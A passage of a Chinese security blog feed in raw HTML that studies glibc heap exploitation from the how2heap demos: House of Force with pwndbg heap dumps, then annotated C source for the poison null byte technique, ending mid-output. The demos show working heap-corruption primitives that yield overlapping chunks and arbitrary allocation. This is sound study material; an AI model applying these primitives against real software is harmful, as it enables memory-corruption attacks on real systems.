class="hljs-type">char</span> *)ptr_top + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br>► <span class="hljs-number">51</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>))));<br><br>  <span class="hljs-number">67</span>   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br>► <span class="hljs-number">68</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><br>  <span class="hljs-number">70</span>   <span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br>► <span class="hljs-number">71</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br>  <span class="hljs-number">73</span>   <span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>► <span class="hljs-number">74</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);<br></code></pre></td></tr></table></figure><p>首先我们申请chunk p1(256),此时</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134897</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们的top chunk起始地址为0x63110而size为134897</p><p>之后我们将top chunk的size设为-1,也就是0xffffffffffffffff</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603110</span><br><span class="hljs-number">0x603110</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>xffffffffffffffff<br><span class="hljs-number">0x603120</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603130</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603140</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603150</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>此时因为top chunk 的size巨大,因此无论我们申请多少的空间,他都不会再调用mmap了</p><p>现在我们计算一下evil_size的大小</p><p>evil_size&#x3D;bss_var-0x20-ptr_top</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x evil_size</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">7 = 0xffffffffffffef30</span><br></code></pre></td></tr></table></figure><p>之后申请一个evil_size大小的chunk</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">18446744073709547329</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x602050</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">4281</span>,<br>  fd = <span class="hljs-number">0</span>x20736<span class="hljs-number">92073696854</span>,<br>  bk = <span class="hljs-number">0</span>x676e6<span class="hljs-number">97274732061</span>,<br>  fd_nextsize = <span class="hljs-number">0</span>x6577<span class="hljs-number">207461687420</span>,<br>  bk_nextsize = <span class="hljs-number">0</span>x6f74207<span class="hljs-number">46e617720</span><br>&#125;<br><span class="hljs-number">0x603108</span> &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0</span>xffffffffffffef41,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们新申请的chunk是从之前的top chunk起始的</p><p>此时如果我们再申请一个chunk就可以拿到我们想要申请的地址了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">18446744073709547329</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602050</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">113</span>,<br>  fd = <span class="hljs-number">0x2073692073696854</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x676e697274732061</span>,<br>  fd_nextsize = <span class="hljs-number">0x6577207461687420</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x6f7420746e617720</span><br>&#125;<br><span class="hljs-number">0x6020c0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">4169</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603108</span> &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0xffffffffffffef41</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方</p><p>随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值</p><p>因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)</p><p>此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的</p><p>现在我们计算出了evil_size所需的值,也就是</p><p>evil_size&#x3D;(bss_var-16)-(ptr_top)-16</p><p>此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top chunk到我们bss_var的差值</p><p>此时我们再申请一块chunk就可以获得我们想控制的var_bss了</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197831">https://www.anquanke.com/post/id/197831</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划五</title>
    <link href="/2020/01/29/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%94/"/>
    <url>/2020/01/29/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<blockquote></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//ctf-wiki.github.io/ctf-wiki</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</span><br></code></pre></td></tr></table></figure><h1 id="poison-null-bytes"><a href="#poison-null-bytes" class="headerlink" title="poison null bytes"></a>poison null bytes</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc</p><p>这个poison null byte利用思路依旧是制造一个overlapping chunk,虽然作者说要在ubuntu14.04上测试,但其实ubuntu16.04也是可以的,说明只要没有tcache,这种攻击方式就是可以使用的:)</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这里我也删了一部分作者的话,加了些注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>                                                                                                                              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>                                                                                                                                      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span>                                                                                                                                      </span><br>                                                                                                                                                         <br>                                                                                                                                                         <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>                                                                                                                                               </span><br><span class="hljs-function"></span>&#123;                                                                                                                                                                                  <br>        <span class="hljs-type">uint8_t</span>* a;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* b;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* c;                                                                                                                                      <br>        <span class="hljs-type">uint8_t</span>* b1;                                                                                                                                     <br>        <span class="hljs-type">uint8_t</span>* b2;                                                                                                                                     <br>        <span class="hljs-type">uint8_t</span>* d;                                                                                                                                      <br>        <span class="hljs-type">void</span> *barrier;                                                                                                                                   <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);                                                                                           <br>        a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);                                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);                                                                                                                   <br>        <span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);             <br>        <span class="hljs-comment">//我们想溢出&#x27;a&#x27;的话,我们需要知道&#x27;a&#x27;的真实大小,因为舍入,a可能比0x100更大(我觉得这个舍入就是加了size,presize然后空间复用了一下</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span>                                                         <br>                <span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);                                                                  <br><br>        <span class="hljs-comment">//chunk size属性的最小的有效字节不能是0x00,最小的也必须是0x10,因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用</span><br>        <span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.                                                               </span><br><span class="hljs-comment">         * the least significant byte of this will be 0x10, because the size of the chunk includes                                                       </span><br><span class="hljs-comment">         * the amount requested plus some amount required for the metadata. */</span>                                                                           <br>        b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);                                                                                                                    <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);                                                                                                                   <br>                                                                                                                                                         <br>        c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);                                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);                                                                                                                   <br>                                                                                                                                                         <br>        barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);              <br><br>        <span class="hljs-comment">//c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题                                                                                                     </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span>                                    <br>                <span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);                                                    <br>                                                                                                                                                         <br>        <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);                                                                                                       <br>                                                                                                                                                         <br>        <span class="hljs-comment">//在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)</span><br>        <span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc                                                                    </span><br>        <span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30        </span><br>        <span class="hljs-comment">//这个被新增的check要求我们允许b中有null指针而不仅仅是c                                       </span><br>        <span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)                                                     </span><br>        <span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;   </span><br>        <span class="hljs-comment">//在新版本的glibc中我们需要让我们更新的size包含b自身去pass &#x27;chunksize(P)!=prev_size(next_chunk(P))&#x27;                                                                                                                </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span>                                      <br>                <span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);           <br>        <br>        <span class="hljs-comment">//我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)</span><br>        <span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)   </span><br>        <span class="hljs-comment">//这个是b.size的值在被null字节覆盖之后的值                                                                              </span><br>        <span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte                                                       </span><br>        *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">+0x1f0</span>) = <span class="hljs-number">0x200</span>;                                                                                                                     <br>        <br>        <span class="hljs-comment">//这个技术通过覆盖一个free chunk的元数据来生效</span><br>        <span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk                                                                         </span><br>        <span class="hljs-built_in">free</span>(b);                                                                                                                                         <br>                                                                                                                                                         <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);                                                                                                  <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>); <br>        <span class="hljs-comment">//我们通过用一个null字节来溢出a来修改b的元数据                                                                                   </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);                                                           <br>        a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;                                                                                          </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);                                                                                                  <br>                                                                                                                                                         <br>        <span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;                                                                                                    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);                                                                                       <br><br>        <span class="hljs-comment">//这个malloc将会在b上调用unlink</span><br>        <span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.   </span><br>        <span class="hljs-comment">//新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                                                     </span><br>        <span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,                                                               </span><br>        <span class="hljs-comment">// will detect the heap corruption now.                                                                                                          </span><br>        <span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                                                            </span><br>        <span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)                                                           </span><br>                <span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br>        <span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>                *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>        b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br>        <span class="hljs-comment">//现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br>                <span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br>                <span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>        <span class="hljs-comment">//我们malloc b2作为我们的攻击目标</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br>        <span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>        b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br>        <span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br>        <br>        <span class="hljs-comment">//现在我们释放b1和c,这将会合并b1和c(无视b2)</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br>        <span class="hljs-built_in">free</span>(b1);<br>        <span class="hljs-built_in">free</span>(c);<br><br>        <span class="hljs-comment">//现在我们malloc d来和b2重叠</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>        d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br>                <span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Welcome <span class="hljs-keyword">to</span> poison <span class="hljs-keyword">null</span> byte <span class="hljs-number">2.0</span>!<br>Tested <span class="hljs-keyword">in</span> Ubuntu <span class="hljs-number">14.04</span> <span class="hljs-number">64</span><span class="hljs-built_in">bit</span>.<br>This technique only works <span class="hljs-keyword">with</span> disabled tcache-option <span class="hljs-keyword">for</span> glibc, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used <span 